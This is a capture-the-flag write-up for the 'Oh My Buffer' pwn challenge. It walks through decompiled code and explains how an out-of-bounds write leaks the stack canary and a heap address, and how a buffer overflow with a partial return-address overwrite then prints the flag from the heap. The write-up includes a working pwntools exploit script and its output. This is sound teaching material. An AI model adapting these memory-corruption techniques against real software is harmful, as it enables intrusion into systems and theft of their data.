---
title: Oh My Buffer
type: writeup
date: 2025-03-30T22:47:05+03:00
description: Writeup for Oh My Buffer [Swamp CTF 2025]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

I may have messed up my I/O calls, but it doesn't matter if everything sensitive has been erased, right?

## Intuition

Open the binary in Ghidra:

```c

void main(void)

{
  int fd_devnull;
  __pid_t _Var1;
  int tmp;
  int tmp2;
  int tmp3;
  long in_FS_OFFSET;
  char local_71;
  int fd_stdout;
  int opt;
  FILE *local_68;
  FILE *devnull;
  char flag [72];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_68 = fopen("flag.txt","r");
  fgets(flag,0x40,local_68);
  fclose(local_68);
  devnull = fopen("/dev/null","w");
  fd_stdout = dup(1);
  fd_devnull = fileno(devnull);
  dup2(fd_devnull,1);
  puts("Here\'s the flag, too bad we don\'t let you see this:");
  fflush(stdout);
  fputs(flag,stdout);
  memset(flag,0,0x40);
  dup2(fd_stdout,1);
  close(fd_stdout);
  fclose(devnull);
  _Var1 = fork();
  if (_Var1 == 0) {
    while( true ) {
      do {
        while( true ) {
          write(1,"===================\n",0x14);
          write(1,"Welcome to the box!\n",0x14);
          write(1,"1) Register\n",0xc);
          write(1,"2) Login\n",9);
          write(1,"3) Exit\n",8);
          write(1,"> ",2);
          do {
            tmp = getchar();
            local_71 = (char)tmp;
          } while (local_71 == '\n');
          opt = atoi(&local_71);
          opt = opt % 3;
          do {
            tmp2 = getchar();
          } while (tmp2 != 10);
          write(1,"-------------------\n",0x14);
          tmp3 = opt % 3;
          if (tmp3 != 2) break;
          login();
        }
      } while (2 < tmp3);
      if (tmp3 == 0) break;
      if (tmp3 == 1) {
        reg();
      }
    }
    _exit(0);
  }
  wait((void *)0x0);
  _exit(0);
}
```

The main function is not very interesting. It reads the flag but prints it to `/dev/null`. Then it deletes it from the stack and puts us in `the box`.
The box has three options: Register, Login, and Exit.

The following function is the `reg()` function:

```c
void reg(void)
{
  long in_FS_OFFSET;
  undefined local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(1,"Username: ",10);
  read(0,local_28,0x2a);
  write(1,"Password: ",10);
  read(0,local_28,0x2a);
  write(1,"Sorry, registration isn\'t open right now!\n",0x2a);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

It is quite obvious there is a buffer overflow in both reads, which allows us to both poison the RBP and overwrite 2 bytes of the return address.
But the stack cookie is quite a pain. Meanwhile, in the `login()` function:

```c
void login(void)
{
  long in_FS_OFFSET;
  int local_2c;
  undefined name [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(1,"How long is your username: ",0x1b);
  __isoc99_fscanf(stdin,"%d",&local_2c);
  write(1,"Username: ",10);
  read(0,name,0x10);
  write(1,"Sorry, we couldn\'t find the user: ",0x22);
  write(1,name,(long)local_2c);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Because we control the write size through `local_2c`, we can leak arbitrary amount of stack content. We can leak the canary and a heap address.
Why should we leak a heap address? Because the flag was also stored there after the `fputs()` function call in `main()`:

```
$ gdb -q ./binary
pwndbg> break fputs
Breakpoint 1 at 0x4010b0
pwndbg> r
pwndbg> fin
pwndbg> search "ctf{"
Searching for value: 'ctf{'
[heap]          0x405480 "ctf{.hidden_baby!}\no bad we don't let you see this:\n"
[stack]         0x7fffffffdd80 'ctf{.hidden_baby!}\n'
```

Great, so even if the stack buffer is zero'd out, we still have the flag on the heap. So strategy is as follows:

1. Leak a bunch of stack data with `login()`.
2. Get heap address leak.
3. Get canary.
4. Overflow the RBP and return address in `reg()`.

But where should we jump? We only have 2 bytes we can change and there's not a lot of good targets.
We have control over RBP, so maybe we can find something that prints a string found relative to RBP?

There is exactly that inside `login()`:

```
0040139b 48 8d 45      LEA       RAX=>name,[RBP + -0x20]
         e0
0040139f 48 89 c6      MOV       RSI,RAX
004013a2 bf 01 00      MOV       EDI,0x1
         00 00
004013a7 e8 b4 fc      CALL      <EXTERNAL>::write                          ssize_t write(int __fd, void
         ff ff
```

Luckily, the RDX register (which is the size of the write) is some big number when we get to jump here.
So everything falls into place! Last and final steps:

5. Change RBP to flag location on the heap + 0x20.
6. Change lower bytes of return address to `0x139b`.
7. Win!

## Solution

Here's what I explained above, but in a script:

```py
#!/usr/bin/env python3

from pwn import *

#target = process("./binary")
target = remote("chals.swampctf.com", 40005)

target.recvuntil(b"> ")
target.sendline(b"2")
target.recvuntil(b"ame: ")
target.sendline(b"80")
target.recvuntil(b"ame: ")
target.sendline(b"a" * 0xf)

leak = target.recv(150)
cookie = u64(leak[58:66])
leak = u64(leak[106:114])
flag = leak - 480 + 0x20 + 960

payload = 0x18 * b"a" + p64(cookie) + p64(flag) + b"\x9b\x13"

target.recvuntil(b"> ")
target.sendline(b"1")
target.recvuntil(b"me: ")
target.sendline(payload)
target.recvuntil(b"rd: ")
target.sendline(payload)
target.interactive()
```

### Flag

```
$ ./solve.py 
[+] Opening connection to chals.swampctf.com on port 40005: Done
b"\x00W\xed\xee+'\xd4\xfb"
b'\xa0\xd2\xe1\x1f\x00\x00\x00\x00'
0x1fe1d4a0
[*] Switching to interactive mode
Sorry, registration isn't open right now!
swampCTF{fUn_w1tH_f0rk5_aN6_fd5}
 let you *** stack smashing detected ***: terminated
```
